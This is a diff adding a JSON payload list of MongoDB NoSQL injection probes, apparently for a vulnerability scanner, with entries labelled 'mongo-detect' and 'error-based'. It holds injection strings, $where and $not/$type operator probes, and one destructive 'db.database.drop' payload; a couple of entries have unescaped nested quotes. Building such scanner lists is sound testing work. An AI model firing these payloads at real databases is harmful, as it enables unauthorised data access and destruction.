@@ -1,0 +1,86 @@
+[
+    {
+      "id": "mongo-detect-003",
+      "description": "auto",
+      "severity": "low",
+      "payload": "' } ], $comment:'successful MongoDB injection'",
+      "category": "error-based"
+    },
+    {
+      "id": "mongo-detect-004",
+      "description": "auto",
+      "severity": "low",
+      "payload": "db.database.drop({$where: \"1 === 1\"})",
+      "category": "error-based"
+    },
+    {
+      "id": "mongo-detect-005",
+      "description": "auto",
+      "severity": "low",
+      "payload": "db.database.stats({$where: \"1 === 1\"})",
+      "category": "error-based"
+    },
+    {
+      "id": "mongo-detect-006",
+      "description": "auto",
+      "severity": "low",
+      "payload": "db.database.getIndexes({$where: \"1 === 1\"})",
+      "category": "error-based"
+    },
+    {
+      "id": "mongo-detect-007",
+      "description": "auto",
+      "severity": "low",
+      "payload": "db.database.createIndex({$where: \"this.user === \"user123\"})",
+      "category": "error-based"
+    },
+    {
+      "id": "mongo-detect-008",
+      "description": "auto",
+      "severity": "low",
+      "payload": "db.collection.find({$where: \"function() {return this.username.indexOf(\"admin\") !== -1}\"})",
+      "category": "error-based"
+    },
+    {
+      "id": "mongo-detect-014",
+      "description": "auto",
+      "severity": "low",
+      "payload": "{\"name\": {\"$not\": { \"$type\": \"string\" }}}",
+      "category": "error-based"
+    },
+    {
+      "id": "mongo-detect-021",
+      "description": "auto",
+      "severity": "low",
+      "payload": "{\"name\": {\"$not\": { \"$type\": 3 }}}",
+      "category": "error-based"
+    },
+    {
+      "id": "mongo-detect-022",
+      "description": "auto",
+      "severity": "low",
+      "payload": "{\"name\": {\"$not\": { \"$type\": 18 }}}",
+      "category": "error-based"
+    },
+    {
+      "id": "mongo-detect-028",
+      "description": "auto",
+      "severity": "low",
+      "payload": "{\"name\": {\"$not\": { \"$type\": 1 }}}",
+      "category": "error-based"
+    },
+    {
+      "id": "mongo-detect-029",
+      "description": "auto",
+      "severity": "low",
+      "payload": "{\"name\": {\"$not\": { \"$type\": 19 }}}",
+      "category": "error-based"
+    },
+    {
+      "id": "mongo-detect-035",
+      "description": "auto",
+      "severity": "low",
+      "payload": "{\"name\": {\"$not\": { \"$type\": 6 }}}",
+      "category": "error-based"
+    }
+  ]
